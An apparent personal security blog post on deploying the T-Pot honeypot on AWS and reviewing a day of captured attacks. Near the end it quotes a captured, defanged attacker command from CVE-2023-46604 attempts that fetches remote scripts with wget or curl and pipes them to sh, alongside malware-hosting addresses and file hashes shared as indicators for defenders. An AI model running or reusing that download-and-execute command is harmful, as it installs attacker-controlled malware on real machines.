---
layout: post
title: 2023-11-28-Deploy-T-Pot-Honeypot-To-AWS
---
![Alt](https://bohansec.com/assets/t-pot-blog/1.jpg)

I had wanted to deploy the T-Pot to the cloud and today I finally pulled off the trigger for this mini-project, so let's do it! In this article, I will walk you through how to deploy the T-Pot Honeypot into AWS from start to finish. 

## So what is T-Pot?

Based on their [Github](https://github.com/telekom-security/tpotce){:target="_blank"} page, T-Pot is the all-in-one, optionally distributed, multi-arch (amd64, arm64) honeypot platform, supporting 20+ honeypots and countless visualization options using the Elastic Stack, animated live attack maps and lots of security tools to further improve the deception experience. The software is developed and currently maintained by the telecom giant T-Mobile.  

**_Please note that since we will use a higher-tier EC2 instance in AWS to meet the T-Pot resource intense requirement, this lab will incur charges. However, if you just want to experiment with T-Pot, then the fee incurred will be relatively small. Likely you will only spend a few bucks even if you keep the instance running for 24 hours._** 

## T-Pot Deployment

First, assuming you have already registered an account at [aws.amazon.com](https://aws.amazon.com/){:target="_blank"}, let's launch an EC2 instance. Here, I choose Canada Central region since I am based in Canada. However, you can deploy the T-Pot anywhere you want based on your preference. The attack you observed from the T-Pot will also be slightly different from region to region.

![image](https://bohansec.com/assets/t-pot-blog/2.png "image")

Once you click on the "Launch Instances" button and on the configuration page, let's click on "Browse more AMIs" and subscribe to the "Debian 11" OS image in the Amazon marketplace. Currently, T-Pot is at version 22.04, and based on my experience, it only supports Debian 11. I tested Ubuntu 22.04, Debian 10, Debian 11, and Debian 12 and at the time of this writing, the only one that worked is Debian 11 so please make sure you use the supported version otherwise your T-Pot instance might not work properly.

![image](https://bohansec.com/assets/t-pot-blog/3.png "image")

![image](https://bohansec.com/assets/t-pot-blog/4.png "image")

![image](https://bohansec.com/assets/t-pot-blog/5.png "image")

Next, let's choose an EC2 instance for our T-Pot. I selected the t3.xlarge instance which in the Canadian region, it will cost me $0.1856 US dollars per hour and it comes with 16 GB RAM, 4vCPU, and up to 5Gigbit network throughput, which meets the T-Pot recommendation that the standalone instance should have 8-16 GB RAM. If costs are a concern for you, you can choose t3.large which comes with 8 GB RAM for a cheaper hourly rate. Please note the difference between the t2 and t3 instances is that the t3 instance is the newer generation and comes with improved hardware, and it is also cheaper compared to the t2 instance so it makes much more sense to use a t3 instance versus a t2 instance. 

![image](https://bohansec.com/assets/t-pot-blog/6.png "image")

Next, we configure the security group or firewall rules for our T-Pot instance. Based on the [documentation](https://github.com/telekom-security/tpotce){:target="_blank"}, we will allow inbound connections for ports 64294, 64295, and 64297 only from our IP, these ports will later used as T-Pot management ports. For the ports between 1 to 64000, we will allow inbound access from anywhere for both ipv4 and ipv6, these will used to lure the attackers in.

![image](https://bohansec.com/assets/t-pot-blog/7.png "image")

In the Key Pair section, you need to set up an SSH keypair and use the private key from your machine to access the instance later. In the Configure Storage section, I set the storage size to 128 GB as recommended by T-Pot however you may get away with the smaller size if you just plan to run the T-Pot for a few hours to a few days. Please note I selected gp2 here but you can choose gp3 SSD if you want to, the only difference is that gp3 will have better performance compared to gp2 since this is a newer generation of their SSD. But for my use case, gp2 is sufficient. Please note storage in AWS will also incur charges but the fee is relatively low. The gp2 SSD in Canada region costs $0.11 per GB-month of provisioned storage. Please refer to this [link](https://aws.amazon.com/ebs/pricing/){:target="_blank"} to learn more about storage prices. After you reviewed all the details, let's click on "Launch Instance".

![image](https://bohansec.com/assets/t-pot-blog/8.png "image")

![image](https://bohansec.com/assets/t-pot-blog/9.png "image")

Before we connect to our instance, let's also create an elastic IP and associate it with our running instance. This will ensure the IP stays the same even if the instance restarted. Please note the elastic IP is free to use when it is linked to a running instance. It will occur fee if your instance is stopped. 

![image](https://bohansec.com/assets/t-pot-blog/10.png "image")

![image](https://bohansec.com/assets/t-pot-blog/11.png "image")

Now, we have a running EC2 instance with our elastic IP associated with it. 

![image](https://bohansec.com/assets/t-pot-blog/12.png "image")

Next, we will SSH into the instance with the private key we configured earlier. Please note the default user for Debian is "admin". 

![image](https://bohansec.com/assets/t-pot-blog/13.png "image")

We will then run the following commands to update the packages and install the Git then pull the T-Pot Github repo to the instance, and finally execute the install scirpt wih sudo. 

```
sudo apt update -y 
sudo apt install git -y
git clone https://github.com/telekom-security/tpotce
cd tpotce/iso/installer/
sudo ./install.sh --type=user
```

![image](https://bohansec.com/assets/t-pot-blog/14.png "image")

![image](https://bohansec.com/assets/t-pot-blog/15.png "image")

![image](https://bohansec.com/assets/t-pot-blog/16.png "image")

Hit "Y" to continue:

![image](https://bohansec.com/assets/t-pot-blog/17.png "image")

Next, select "STANDARD" installation and set up a username and password for your Web Admin UI..

![image](https://bohansec.com/assets/t-pot-blog/18.png "image")

![image](https://bohansec.com/assets/t-pot-blog/19.png "image")

![image](https://bohansec.com/assets/t-pot-blog/20.png "image")

After a few mins, we can see the installation process is completed. Please note we won't be able to SSH into the instance from port 22 anymore and you will notice your connection is lost. You need to use port 64295 if you need to SSH into the instance moving forward.

![image](https://bohansec.com/assets/t-pot-blog/21.png "image")

Let's SSH into our instance over port 64295 and verify all the services are running correctly and that T-Pot is Active. You need to run the "dps.sh" command in the root account. We can see our T-Pot is Active and all the Honeypot services are running.

![image](https://bohansec.com/assets/t-pot-blog/22.png "image")

We will then navigate to the Web UI of the instance over port 64297, after you enter the credentials you can see we have successfully installed the T-Pot instance.  

![image](https://bohansec.com/assets/t-pot-blog/23.png "image")

![image](https://bohansec.com/assets/t-pot-blog/24.png "image")

## Play Around with T-Pot

Let's view the beautiful Attack Map in action: 

![gif](https://bohansec.com/assets/t-pot-blog/25.gif "gif")

I kept the instance running for 24 hours to just collect enough attack data, you can see in the last 24 hours there have been quite a few attacks hit to my instance, more than 14000 for Cowire and 11000 for Honeytrap. The IP based in Mexico seems to contribute to the majority of the attacks.

![image](https://bohansec.com/assets/t-pot-blog/26.png "image")

![image](https://bohansec.com/assets/t-pot-blog/27.png "image")

We can see the most targeted account on my SSH and Telnet services is the "root" with the password "123456".

![image](https://bohansec.com/assets/t-pot-blog/28.png "image")

Let's also examine the Suricata results, we can see there is some Nmap and RDP scanning activity, and most notably there are attempts on CVE-2023-46604 which is a critical vulnerability for Apache ActiveMQ. This vulnerability has been observed being exploited in the wild and comes with Cryptominers and Rootkits being deployed once successful. Please refer to the following link to learn more about it:

[CVE-2023-46604 (Apache ActiveMQ) Exploited to Infect Systems With Cryptominers and Rootkits](https://www.trendmicro.com/en_ae/research/23/k/cve-2023-46604-exploited-by-kinsing.html){:target="_blank"}

![image](https://bohansec.com/assets/t-pot-blog/29.png "image")

Out of curiosity, I examined one of the payloads that was captured from the CVE-2023-46604 attempts.

```
hxxp[://]188[.]166[.]177[.]88/wp-content/themes/twentynineteen/poc2[.]xml
```

![image](https://bohansec.com/assets/t-pot-blog/30.png "image")

In the screenshot, we can see the above URL is used to host additional malware download commands by the threat actors:

```
bash-ccurl hxxp[://]208[.]115[.]245[.]46:2002/a; (wget -qO - hxxp[://]161[.]35[.]219[.]184/[.]s/1sh || curl hxxp[://]161[.]35[.]219[.]184/[.]s/3sh) | sh
```

![image](https://bohansec.com/assets/t-pot-blog/31.png "image")

After downloading the content from the above URLs, it appears additional malware payload was hosted at the following URL:

```
hxxp[://]139[.]180[.]185[.]248/wp-content/
```

![image](https://bohansec.com/assets/t-pot-blog/32.png "image")

Examing of the hashes in VirusTotal, we found these "PTY" files appears to be some sort of Linux trojan that used by attackers to gain control on the comprimised Linux machines. 

![image](https://bohansec.com/assets/t-pot-blog/33.png "image")

![image](https://bohansec.com/assets/t-pot-blog/34.png "image")

![image](https://bohansec.com/assets/t-pot-blog/35.png "image")

IOCs

```
188[.]166[.]177[.]88
208[.]115[.]245[.]46
161[.]35[.]219[.]184
139[.]180[.]185[.]248
594b980087f86d2278a47d865397c18815425f092f0fdadcf6390918c126f9ad  3sh.txt
ad6d3b0b2d5727a764677fcedad49d1f43a46c732881721134afc1ca0fb3400d  a.txt
d3fd8d78dbdde8260ee3e0a868f9d5af5b6fd496b7b085ef54633a7287b904bf  lsh.txt
176c57e3fa7da2fb2afcd18242b79e5881c2244f5ab836897d4846885f1bd993  pty1
6730eb04edf45d590939d7ba36ca0d4f1d2f28a2692151e3c631e9f2d3612893  pty10
a7bf3c031ab66265ce724fc26c8f7565442a098b06b01ea8871f13179d168713  pty2
9e28f942262805b5fb59f46568fed53fd4b7dbf6faf666bedaf6ff22dd416572  pty3
86947b00a3d61b82b6f752876404953ff3c39952f2b261988baf63fbbbd6d6ae  pty4
1f9cda58cea6c8dd07879df3e985499b18523747482e8f7acd6b4b3a82116957  pty5
```

[Attacker Source IP - Top 10 - Nov 27 - 28]("https://bohansec.com/assets/t-pot-blog/Attacker Source IP - Top 10.csv"){:target="_blank"}

[Suricata Source IP - Top 10 - Nov 27 - 28]("https://bohansec.com/assets/t-pot-blog/Suricata Source IP - Top 10.csv"){:target="_blank"}

As demonstrated in this blog, a honeypot proves to be a formidable tool for capturing and analyzing emerging attack trends and Indicators of Compromise (IOCs).

That concludes today's content; thank you for reading, and I hope you find it beneficial in various ways.